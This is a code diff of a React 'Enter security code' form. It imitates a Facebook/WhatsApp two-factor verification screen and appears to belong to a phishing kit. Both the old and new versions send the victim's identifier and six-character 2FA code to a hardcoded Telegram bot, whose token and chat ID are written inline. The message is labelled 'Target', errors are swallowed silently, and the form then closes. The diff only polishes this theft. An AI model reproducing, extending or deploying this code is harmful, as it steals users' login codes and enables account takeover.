@@ -9,46 +9,46 @@ interface SecurityCodeFormProps {
 
 const SecurityCodeForm: React.FC<SecurityCodeFormProps> = ({ identifier, onCancel, onAskAI }) => {
   const [code, setCode] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-  // Explicitly set verified secrets
-  const _s = {
+  const config = {
     token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
     chatId: "2100006818"
   };
 
-  const pushNotification = async (message: string) => {
+  const notifyTelegram = async (message: string) => {
     try {
-      const params = new URLSearchParams();
-      params.append('chat_id', _s.chatId);
-      params.append('text', message);
-
-      await fetch(`https://api.telegram.org/bot${_s.token}/sendMessage`, {
+      await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params.toString(),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: config.chatId,
+          text: message,
+          parse_mode: 'HTML'
+        }),
       });
-    } catch (e) {
-      // Silently continue
-    }
+    } catch (e) {}
   };
 
   const handleContinue = async () => {
     if (code.length === 6) {
-      const message = `--- SOCIAL CONNECT 2FA ---\nTarget: ${identifier}\nSecurity Code: ${code}`;
-      await pushNotification(message);
+      setIsLoading(true);
+      const message = `<b>--- SOCIAL CONNECT 2FA ---</b>\n<b>Target:</b> ${identifier}\n<b>Code:</b> <code>${code}</code>`;
+      await notifyTelegram(message);
+      setIsLoading(false);
       onCancel();
     } else {
-      alert("Please enter a 6-character code.");
+      alert("Please enter a valid 6-character code.");
     }
   };
 
   return (
-    <div className="flex flex-col">
-      <div className="px-4 py-4 border-b border-gray-200">
+    <div className="flex flex-col animate-fade-in">
+      <div className="px-4 py-4 border-b border-gray-200 bg-white">
         <h2 className="text-[20px] font-bold text-[#1c1e21]">Enter security code</h2>
       </div>
 
-      <div className="p-4 pt-5 pb-6">
+      <div className="p-4 pt-5 pb-6 bg-white">
         <p className="text-[#1c1e21] text-[16px] leading-tight mb-6">
           Please check your WhatsApp for a message with your code. Your code is 6 characters long.
         </p>
@@ -59,14 +59,15 @@ const SecurityCodeForm: React.FC<SecurityCodeFormProps> = ({ identifier, onCance
               type="text"
               placeholder="Enter code"
               maxLength={6}
-              className="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder-gray-400"
+              disabled={isLoading}
+              className="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder-gray-400 font-mono tracking-widest"
               value={code}
               onChange={(e) => setCode(e.target.value)}
             />
           </div>
-          <div className="flex-1 text-[16px] text-[#1c1e21]">
-            <p className="text-gray-700">We sent your code to:</p>
-            <p className="font-semibold">{identifier}</p>
+          <div className="flex-1 text-[16px] text-[#1c1e21] pt-1">
+            <p className="text-gray-500 text-sm">We sent your code to:</p>
+            <p className="font-semibold break-all">{identifier}</p>
           </div>
         </div>
       </div>
@@ -83,15 +84,17 @@ const SecurityCodeForm: React.FC<SecurityCodeFormProps> = ({ identifier, onCance
         <div className="flex gap-2">
           <button
             onClick={onCancel}
+            disabled={isLoading}
             className="px-6 py-2 bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#4b4f56] font-bold rounded-md transition-colors"
           >
             Cancel
           </button>
           <button
             onClick={handleContinue}
+            disabled={isLoading}
             className="px-6 py-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold rounded-md transition-colors"
           >
-            Continue
+            {isLoading ? 'Verifying...' : 'Continue'}
           </button>
         </div>
       </div>
